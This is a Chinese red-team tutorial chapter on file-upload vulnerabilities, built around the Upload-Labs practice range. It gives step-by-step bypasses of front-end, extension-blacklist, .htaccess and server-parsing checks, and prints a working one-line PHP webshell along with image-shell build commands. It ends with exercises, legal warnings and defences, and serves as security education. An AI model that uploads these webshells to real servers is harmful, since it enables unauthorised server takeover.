## 📚 案例讲解

### 案例1：前端验证绕过实战

**场景**：一个用户头像上传功能，前端提示只能上传jpg/png/gif图片。

**目标**：绕过前端验证，上传PHP Webshell。

**步骤**：

1. **分析前端验证**
   - 选择shell.php文件，点击上传
   - 浏览器弹窗提示"只能上传jpg/png/gif文件"
   - 页面没有刷新，说明是前端JS验证

2. **查看前端代码**
   - 按F12打开开发者工具
   - 找到checkFile函数
   - 分析验证逻辑：检查文件后缀

3. **方法一：抓包修改（最可靠）**
   - 将shell.php重命名为shell.jpg
   - 选择shell.jpg上传
   - Burp拦截请求
   - 修改请求中的filename：
     ```
     Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
     ```
     改为：
     ```
     Content-Disposition: form-data; name="upload_file"; filename="shell.php"
     ```
   - 放行请求
   - 上传成功！

4. **方法二：禁用JS**
   - Chrome设置 → 网站设置 → JavaScript → 禁用
   - 刷新页面
   - 直接上传shell.php
   - 上传成功！

5. **方法三：修改前端代码**
   - F12打开控制台
   - 删除onclick事件或修改checkFile函数
   - 直接上传PHP文件

6. **验证Webshell**
   - 访问 /upload/shell.php
   - 用蚁剑连接，密码为cmd
   - 成功获取服务器权限

**总结**：前端验证只能防君子，不能防小人。所有前端验证都可以被绕过，后端验证才是关键。

---

### 案例2：后缀名绕过实战

**场景**：网站有文件上传功能，后端验证文件后缀名（黑名单方式）。

**目标**：绕过黑名单验证，上传可执行的脚本文件。

**步骤**：

1. **测试黑名单**
   - 上传shell.php → 失败
   - 上传shell.asp → 失败
   - 上传shell.jsp → 失败
   - 确认是黑名单验证

2. **尝试各种后缀**

   | 后缀名 | 结果 | 说明 |
   |-------|------|------|
   | .php | ❌ 失败 | 在黑名单中 |
   | .php3 | ✅ 成功 | 不在黑名单中 |
   | .php5 | ✅ 成功 | 不在黑名单中 |
   | .phtml | ✅ 成功 | 不在黑名单中 |
   | .Php | ✅ 成功 | 大小写绕过 |
   | .php. | ✅ 成功 | 点号绕过（Windows） |
   | .php空格 | ✅ 成功 | 空格绕过（Windows） |

3. **验证解析**
   - 上传shell.php3
   - 访问 /upload/shell.php3
   - 如果页面显示PHP代码，说明没有配置解析
   - 如果页面空白或执行了代码，说明成功

4. **Apache解析配置确认**
   - 查看httpd.conf中的配置：
     ```apache
     AddType application/x-httpd-php .php .php3 .php4 .phtml
     ```
   - 如果有这些配置，对应后缀就能执行

5. **选择最合适的后缀**
   - 根据服务器环境选择能解析的后缀
   - 优先尝试 .php3、.phtml
   - Windows环境可以尝试大小写、空格、点号绕过

**总结**：黑名单验证永远是不可靠的，因为总会有遗漏的后缀。白名单验证比黑名单更安全。

---

### 案例3：图片马制作与利用

**场景**：网站严格验证文件类型，只允许上传图片文件。

**目标**：制作图片马，配合文件包含漏洞获取Webshell。

**步骤**：

1. **准备材料**
   - 一张正常的JPG图片（normal.jpg）
   - 一句话木马（shell.php）
   ```php
   <?php @eval($_POST['cmd']); ?>
   ```

2. **制作图片马**

   **Linux/Mac下**：
   ```bash
   # 方法1：直接拼接
   cat normal.jpg shell.php > shell.jpg
   
   # 验证
   file shell.jpg  # 显示 JPEG image data
   ```

   **Windows下**：
   ```cmd
   copy normal.jpg /b + shell.php /a shell.jpg
   ```

   **手动添加文件头（纯PHP伪图片）**：
   ```php
   GIF89a<?php @eval($_POST['cmd']); ?>
   ```
   保存为shell.php，然后改名为shell.gif

3. **验证图片马**
   ```bash
   # 查看文件类型
   file shell.jpg
   # 输出：JPEG image data, JFIF standard 1.01
   
   # 查看末尾的PHP代码
   tail -c 50 shell.jpg
   ```

4. **上传图片马**
   - 上传shell.jpg
   - 验证上传成功
   - 直接访问图片，会正常显示图片（PHP代码在最后，不影响显示）

5. **利用文件包含漏洞执行**
   - 找到文件包含漏洞页面：`?page=xxx`
   - 构造Payload：
     ```
     ?page=../../upload/shell.jpg
     ```
   - 页面会执行图片中的PHP代码

6. **连接Webshell**
   - 用蚁剑连接包含页面
   - URL：`http://target.com/include.php?page=../../upload/shell.jpg`
   - 密码：cmd
   - 成功获取Webshell

**图片马的局限性**：
- 直接访问图片不会执行PHP（除非有解析漏洞）
- 需要配合文件包含、解析漏洞或.htaccess才能执行
- 图片二次渲染会清除追加的代码

---

### 案例4：.htaccess利用实战

**场景**：网站使用黑名单验证文件上传，且禁止了几乎所有脚本后缀。

**目标**：通过上传.htaccess文件，自定义解析规则，获取Webshell。

**条件**：
- 服务器是Apache
- 启用了.htaccess（AllowOverride All）
- 黑名单中没有.htaccess

**步骤**：

1. **确认服务器类型**
   - 查看HTTP响应头：`Server: Apache/2.4.41`
   - 确认是Apache服务器

2. **测试.htaccess是否被禁止**
   - 尝试上传.htaccess文件
   - 如果成功上传，说明可以利用

3. **制作.htaccess文件**

   **版本一：所有jpg文件按PHP解析**
   ```apache
   AddType application/x-httpd-php .jpg
   ```

   **版本二：指定文件按PHP解析**
   ```apache
   <FilesMatch "shell.jpg">
       SetHandler application/x-httpd-php
   </FilesMatch>
   ```

   **版本三：使用php_value**
   ```apache
   php_value auto_append_file "images/shell.jpg"
   ```

4. **上传.htaccess**
   - 注意：文件名必须是 `.htaccess`
   - Burp中直接设置 filename=".htaccess"
   - 上传成功

5. **上传图片马**
   - 上传shell.jpg（包含PHP代码的图片）
   - 内容：`<?php @eval($_POST['cmd']); ?>`
   - 或使用真图片马

6. **验证执行**
   - 访问 `/upload/shell.jpg`
   - 如果返回PHP信息或空白，说明PHP被执行了
   - 如果显示图片，说明没有执行（检查.htaccess是否生效）

7. **连接Webshell**
   - 蚁剑连接：URL填 `/upload/shell.jpg`，密码cmd
   - 成功获取Webshell

**.htaccess的其他攻击手法**：
- 目录列表：`Options +Indexes`
- 自定义错误页面：`ErrorDocument 404 /shell.php`
- 重定向：`Redirect 302 / http://attacker.com/`
- 修改PHP配置：`php_value include_path "/tmp"`

**防御方法**：
- 在黑名单中加入.htaccess
- Apache配置中设置 AllowOverride None
- 上传目录设置为不可执行

---

### 案例5：解析漏洞利用实战

**场景**：网站使用白名单验证，只允许上传jpg/png/gif图片，但服务器存在解析漏洞。

**目标**：利用解析漏洞，让图片文件被当作PHP执行。

**常见的解析漏洞**：

**1. Apache解析漏洞**

Apache从右往左解析后缀名，遇到不认识的就往左继续。

```
shell.php.jpg
  ↑    ↑    ↑
  不认识  认识 不认识？
  实际：从右往左，.jpg不认识（在某些配置下），继续往左看到.php，按PHP解析
```

**利用方式**：
- 上传 shell.php.jpg
- 访问时，Apache会按PHP解析

**2. Nginx解析漏洞（空字节/文件名）**

旧版本Nginx存在解析漏洞：
```
/shell.jpg/shell.php
/shell.jpg%00.php
```

Nginx会先找shell.jpg，找到后，然后用PHP解析后面的路径。

**3. IIS解析漏洞**

IIS 6.0有两个著名解析漏洞：
- 目录解析：`/xx.asp/xx.jpg` 按asp解析
- 文件名解析：`xx.asp;.jpg` 分号后面的被忽略

**步骤（以Apache为例）**：

1. **确认服务器**
   - 通过响应头确认是Apache
   - 测试解析漏洞

2. **构造文件名**
   - 将shell.php重命名为shell.php.jpg
   - 或 shell.php.png

3. **上传文件**
   - 白名单验证通过（后缀是.jpg）
   - 上传成功

4. **测试解析**
   - 访问 `/upload/shell.php.jpg`
   - 如果PHP代码被执行，说明存在解析漏洞
   - 如果显示图片或源码，说明不存在

5. **获取Webshell**
   - 用蚁剑连接 `/upload/shell.php.jpg`
   - 密码：cmd
   - 成功获取权限

**解析漏洞的防御**：
- 升级Web服务器到最新版本
- 正确配置文件解析规则
- 上传目录禁止执行脚本
- 文件名严格白名单+随机重命名

---

## ✏️ 课后习题

### 选择题

1. Upload-Labs靶场的开发者是？
   - A. c0ny1
   - B. Audi-1
   - C. digininja
   - D. p0wd3r

2. Upload-Labs一共有多少个关卡？
   - A. 10个
   - B. 15个
   - C. 21个
   - D. 30个

3. 前端JS验证的文件上传，最简单的绕过方法是？
   - A. 修改文件名
   - B. 抓包修改Content-Type
   - C. 禁用JavaScript或抓包修改文件名
   - D. 上传图片马

4. MIME类型（Content-Type）验证的绕过方法是？
   - A. 修改文件名后缀
   - B. 修改HTTP请求中的Content-Type
   - C. 上传图片马
   - D. 使用%00截断

5. 以下哪个后缀不能用于PHP黑名单绕过？
   - A. .php3
   - B. .phtml
   - C. .jpg
   - D. .php5

6. .htaccess文件可以用于哪种服务器？
   - A. Nginx
   - B. Apache
   - C. IIS
   - D. Tomcat

7. %00截断漏洞的条件不包括？
   - A. PHP版本 < 5.3.4
   - B. magic_quotes_gpc = Off
   - C. 文件路径用户可控
   - D. 必须是Windows服务器

8. 图片马需要配合什么才能执行PHP代码？
   - A. 文件包含漏洞
   - B. SQL注入漏洞
   - C. XSS漏洞
   - D. CSRF漏洞

9. 二次渲染绕过的原理是？
   - A. 在图片特定区域植入代码，渲染后保留
   - B. 二次渲染会验证失败
   - C. 渲染后文件变小了
   - D. 使用特殊的图片格式

10. 条件竞争上传绕过的原理是？
    - A. 服务器处理速度慢
    - B. 文件上传和删除之间存在时间差
    - C. 多线程上传更快
    - D. 服务器不会删除文件

### 填空题

1. Upload-Labs靶场的开发者是 _______。
2. 文件上传漏洞的三大条件是 _______、_______、_______。
3. 前端验证的三种绕过方法是 _______、_______、_______。
4. MIME类型验证中，JPG图片的Content-Type是 _______。
5. 黑名单验证的常见绕过方式有 _______、_______、_______、_______。
6. Apache的配置文件 _______ 可以自定义目录的解析规则。
7. %00截断利用的是 _______ 字节，PHP版本需要 _______。
8. 制作图片马的Linux命令是 _______。
9. getimagesize()函数的作用是 _______。
10. 文件上传防御中，比黑名单更安全的是 _______。

### 简答题

1. 简述文件上传漏洞的原理和危害。
2. 前端验证和后端验证有什么区别？为什么前端验证不安全？
3. MIME类型验证为什么可以被绕过？如何绕过？
4. 黑名单和白名单验证哪个更安全？为什么？
5. 什么是图片马？如何制作和利用？
6. .htaccess文件的作用是什么？如何利用它绕过上传验证？
7. %00截断的原理是什么？需要什么条件？
8. 什么是二次渲染？如何绕过二次渲染的图片验证？
9. 条件竞争上传的原理是什么？如何利用？
10. 如何防御文件上传漏洞？至少说出5种方法。

### 实操题

1. 使用Docker搭建Upload-Labs环境。
2. 通关Pass-01（前端JS验证绕过）。
3. 通关Pass-02（MIME类型验证绕过）。
4. 通关Pass-03（黑名单后缀绕过）。
5. 通关Pass-04（.htaccess绕过）。
6. 通关Pass-05（大小写绕过）和Pass-06（空格绕过）。
7. 制作一张图片马，并验证文件类型检测会通过。
8. 通关Pass-11（GET型%00截断）。
9. 通关Pass-13（图片马绕过），配合文件包含执行PHP代码。
10. 研究Pass-17（条件竞争）的原理，尝试编写脚本利用。
11. 对比Pass-01到Pass-10的源码，总结每种绕过的原理。
12. 设计一个安全的文件上传功能，写出你的防护方案。

---

## ⚠️ 安全提醒

::: danger 重要提醒
1. **仅在授权环境中练习**：本章涉及的文件上传技术仅限在Upload-Labs等授权靶场中学习和练习，严禁对未授权的真实系统进行测试。

2. **法律后果**：利用文件上传漏洞上传Webshell、窃取数据、篡改网站等行为均属于违法行为，将承担相应的法律责任。《刑法》第285条、286条对此有明确规定。

3. **危害严重**：文件上传漏洞是危害最大的Web漏洞之一，可直接导致服务器被控制。请务必谨慎使用所学技术。

4. **道德准则**：学习文件上传漏洞是为了更好地防御，保护网站和用户数据安全。请遵守网络安全从业者的职业道德。

5. **合法研究**：如果发现真实网站的文件上传漏洞，应通过合法渠道（如SRC平台）上报，而不是利用或传播。

6. **环境安全**：练习用的靶场环境要确保隔离，不要暴露在公网上，避免被他人利用。
:::

---

## 📝 本章小结

- Upload-Labs是学习文件上传漏洞的最佳靶场，21个关卡覆盖各种绕过场景
- 文件上传漏洞是危害最大的Web漏洞之一，可直接获取服务器控制权
- 前端验证不可靠，所有前端验证都能被绕过（禁用JS、抓包修改）
- MIME类型验证可通过修改Content-Type头绕过
- 黑名单验证可通过罕见后缀、大小写、空格、点号、特殊符号等绕过
- .htaccess是Apache的配置文件，可自定义解析规则，威力巨大
- %00截断利用NULL字节截断字符串，需要特定PHP版本
- 图片马是图片+代码的结合体，需配合文件包含或解析漏洞使用
- 二次渲染会清除追加的代码，需要在图片数据区域植入代码
- 条件竞争利用上传和删除的时间差，并发访问执行代码
- 防御文件上传的核心：白名单+随机命名+不可执行目录+内容验证

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day087-target-靶场3-XSS-Challenges)
- [➡️ 下一章：靶场5：WebGoat — OWASP 官方 Web 安全教学平台](/redteam/day089-target-靶场5-WebGoat)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
